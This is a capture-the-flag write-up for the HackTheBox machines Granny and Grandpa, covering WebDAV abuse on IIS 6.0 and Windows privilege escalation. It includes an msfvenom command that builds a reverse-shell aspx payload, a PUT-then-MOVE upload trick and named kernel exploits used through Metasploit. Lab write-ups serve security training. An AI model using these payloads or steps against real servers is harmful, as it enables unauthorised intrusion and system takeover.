<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Granny & Grandpa</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body>
    <div class='page'>                                                                                                                                                                                                    <a href=""><img src="images/655-1.png" alt="images/655-1.png" /></a><h1>                                  <br />       </h1><a href=""><img src="images/655-2.png" alt="images/655-2.png" /></a><br /><br />This is the writeup for both Granny and Grandpa from HackTheBox.eu..<br /><br />Two Easy/Medium Windows boxes, lets Hack!!!<br /><br />Lets scan Granny...<br /><br /><a href=""><img src="images/655-3.png" alt="images/655-3.png" /></a><br /><br />Seems only 1 port is open, HTTP running Microsoft IIS 6.0 which is Server 2003<br /><br /><br />What is WebDAV?<br />WebDAV (<a href="https://tools.ietf.org/html/rfc4918">RFC 4918</a>) is an extension to <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">HTTP</a>,  the internet protocol that web-browsers and webservers use to  communicate with each other. The WebDAV protocol enables a webserver to  behave like a fileserver too, supporting collaborative authoring of web  content.<br /><br />Lets start our background enumeration, then find out whats going on with webdav... <br /><br /><br /><a href=""><img src="images/655-4.png" alt="images/655-4.png" /></a><br /><br />Lets run a davtest and see what the response is...<br /><br /><a href=""><img src="images/655-5.png" alt="images/655-5.png" /></a><br /><br /><a href=""><img src="images/655-6.png" alt="images/655-6.png" /></a><br /><br />The main thing to take away from davtest is the ability for file execution, we have file execution for both txt and html, lets use burp to see exactly whats going on...<br /><br /><a href=""><img src="images/655-7.png" alt="images/655-7.png" /></a><br /><br />So we can see its just using PUT, lets and change this to something like this...<br /><br /><a href=""><img src="images/655-8.png" alt="images/655-8.png" /></a><br /><br /><a href=""><img src="images/655-9.png" alt="images/655-9.png" /></a><br /><br />Alright, so we created a file, now we need to find one that will be executed.. With this being a Windows IIS box, it should run aspx <br /><br />We can generate a payload with msfvenom...<br /><br />msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=(PORT) -f aspx<br /><br />We need to upload this as an aspx file and not html as it will not execute... <br /><br />** Don&#39;t forget your Listener **<br /><br />We get denied uploading the aspx file.. but NMAP shows us that we have quite a few options with the webserver, for instance the MOVE cmd..<br /><br /><a href=""><img src="images/655-10.png" alt="images/655-10.png" /></a><br /><br /><a href=""><img src="images/655-11.png" alt="images/655-11.png" /></a><br /><br />Alright, we have a shell as NT AUTHORITY\NETWORK SERVICE...<br /><br />Running suggester will show you a few exploits..<br /><br /><a href=""><img src="images/655-12.png" alt="images/655-12.png" /></a><br /><br />After playing around with the “vulnerable” exploits, Using ms14_070_tcpip_ioctl will grant NT AUTH... <br /><br /><a href=""><img src="images/655-13.png" alt="images/655-13.png" /></a><br /><br />-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br />Lets scan Grandpa!!!<br /><br /><a href=""><img src="images/655-14.png" alt="images/655-14.png" /></a><br /><br />We can see roughly the same results, though we do not have as much priviledge with webdav... <br /><br />Enumeration of IIS 6.0 leads us too<br /><a href="https://www.exploit-db.com/exploits/41992">https://www.exploit-db.com/exploits/41992</a><br /><br />Fire up msfconsole and set parameters... <br /><br /><a href=""><img src="images/655-15.png" alt="images/655-15.png" /></a><br /><br />The exploit grants us NT AUTH\NET.. Just like Granny, background the session and run suggester..<br /><br /><a href=""><img src="images/655-16.png" alt="images/655-16.png" /></a><br /><br />I tried playing around with a few others but ms15 worked...<br /><br /><a href=""><img src="images/655-17.png" alt="images/655-17.png" /></a><br /><br />That wraps up Granny &amp; Grandpa from HackTheBox.eu<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>